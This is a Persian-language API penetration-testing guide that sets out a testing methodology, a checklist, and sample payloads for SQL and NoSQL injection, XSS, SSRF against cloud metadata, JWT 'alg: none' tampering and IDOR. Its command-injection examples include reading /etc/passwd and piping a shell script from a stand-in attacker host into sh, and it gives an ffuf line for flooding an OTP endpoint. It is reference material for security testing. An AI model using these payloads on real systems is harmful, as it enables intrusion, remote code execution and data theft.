# api


مراحل کلی تست نفوذ API
شناسایی و مستندسازی API

پیدا کردن endpointها با استفاده از:

مستندات رسمی (Swagger, Postman)

ابزارهای تست (Burp Suite, OWASP ZAP)

فایل‌های لو رفته (swagger.json, openapi.json)

Reverse Engineering اپلیکیشن یا PWA

شناسایی متدها (GET, POST, PUT, DELETE, PATCH) و پارامترها.

بررسی احراز هویت و مجوز (Auth & Access Control)

تست توکن‌ها (JWT, API Key)

تست Broken Authentication (ورود بدون رمز، JWT بدون امضا)

تست Broken Access Control (IDOR: تغییر user_id و دسترسی به داده دیگران)

تست اعتبارسنجی ورودی‌ها

بررسی ورودی‌ها برای XSS، SQLi، NoSQLi، Command Injection، SSRF.

استفاده از payload های مناسب هر آسیب‌پذیری.

تست منطق بیزینسی (Logical flaws)

دور زدن محدودیت‌ها (Rate Limit Bypass، تغییر قیمت کالا، دوبار انجام تراکنش)

تست ترتیب درخواست‌ها (Race Conditions)

تست امنیت انتقال داده‌ها

اطمینان از استفاده از HTTPS

بررسی برای Sensitive Data Exposure

ابزارهای مفید

Postman / Insomnia (برای درخواست‌های دستی)

Burp Suite / OWASP ZAP (برای رهگیری و تزریق)

ffuf / wfuzz (برای brute-force روی پارامترها و endpointها)

nuclei (برای اسکن خودکار API)


======================================================================


نمونه پیلودها برای تست نفوذ API
1. SQL Injection

```
' OR 1=1 --
" OR "1"="1
1') UNION SELECT null,null,null--
```
نمونه تست در پارامتر:

```
POST /api/user
{"id": "' OR 1=1 --"}
```

2. NoSQL Injection (MongoDB)

```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

4. XSS (برای APIهایی که خروجی HTML دارند)

```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

4. Command Injection

```
; cat /etc/passwd
&& ping -c 1 attacker.com
| curl http://attacker.com/shell.sh | sh
```

5. SSRF

```
{"url": "http://127.0.0.1:8080/admin"}
{"url": "file:///etc/passwd"}
{"url": "http://169.254.169.254/latest/meta-data/"} // AWS metadata
```

6. JWT Manipulation
حذف امضا یا تغییر الگوریتم:

```
{"alg": "none", "typ": "JWT"}
```
تغییر payload:

```
{"role": "admin"}
```

7. IDOR (Insecure Direct Object Reference)
تغییر شناسه در URL یا Body:

```
GET /api/user/123
GET /api/user/124   // باید داده کاربر دیگر نمایش داده نشود
```

8. Rate Limit Bypass
ارسال تعداد زیادی درخواست پشت سر هم با:

```
ffuf -u https://target/api/send_otp -w phone_numbers.txt
```

=================================================================

# چک‌لیست تست نفوذ API (نسخه ۲۰۲۵)

## 1. شناسایی (Recon & Fuzzing)
- [ ] اجرای fuzzing روی مسیرها، پارامترها، هدرها برای کشف endpointهای مخفی
- [ ] تست پروتکل‌های غیراستاندارد (HTTP روی پورت ۸۰)
- [ ] استفاده از OPTIONS برای شناسایی متدهای مجاز
- [ ] تغییر نسخه API در مسیر (`/api/v1/endpoint` → `/api/v2/endpoint`)

## 2. احراز هویت (Authentication)
- [ ] تست User Enumeration و Brute-Force
- [ ] تست Credential Stuffing
- [ ] بررسی مکانیزم قفل حساب / CAPTCHA
- [ ] تست ریست‌پسورد بدون محافظت کافی

## 3. کنترل دسترسی (Authorization / IDOR)
- [ ] تست IDOR با تغییر شناسه‌ها در URL و Body
- [ ] تست افزایش سطح دسترسی عمودی (Vertical Privilege Escalation)
- [ ] تست افزایش سطح دسترسی افقی (Horizontal Privilege Escalation)

## 4. منطق تجاری (Business Logic Flaws)
- [ ] تست دور زدن Rate Limiting با تغییر هدر `X-Forwarded-For`
- [ ] دستکاری قیمت یا تخفیف (`price: -999`)
- [ ] تست مقادیر بسیار بزرگ یا غیرمنتظره
- [ ] تست چندبار استفاده از کوپن یا تراکنش دوباره (Race Conditions)

## 5. آسیب‌پذیری‌های کلاسیک
- [ ] SQL Injection / NoSQL Injection
- [ ] XSS (در خروجی HTML)
- [ ] SSRF
- [ ] Command Injection
- [ ] تست عدم اعتبارسنجی ورودی
- [ ] بررسی HTTPS و هدرهای امنیتی (HSTS)

## 6. افشای داده (Sensitive Data Exposure)
- [ ] تست محدودیت نرخ (Rate Limiting)
- [ ] تست افشای PII یا توکن‌ها در پاسخ‌ها یا خطاها

## 7. گزارش‌دهی و بازآزمایی
- [ ] تهیه گزارش با سطح خطر، نحوه رفع، و وضعیت Retest
- [ ] اولویت‌بندی آسیب‌ها بر اساس شدت و پیچیدگی

## 8. نظارت مستمر
- [ ] پیاده‌سازی Runtime API Protection
- [ ] پایش حملات سرریز، رفتار نابهنجار یا تهدیدات نوظهور

---

# پیلودهای رایج ۲۰۲۵ (بر اساس گزارش هانترها)

## 1. SQL Injection
```sql
' OR 1=1 --
" OR "1"="1
1') UNION SELECT null,null,null--


==================================================================
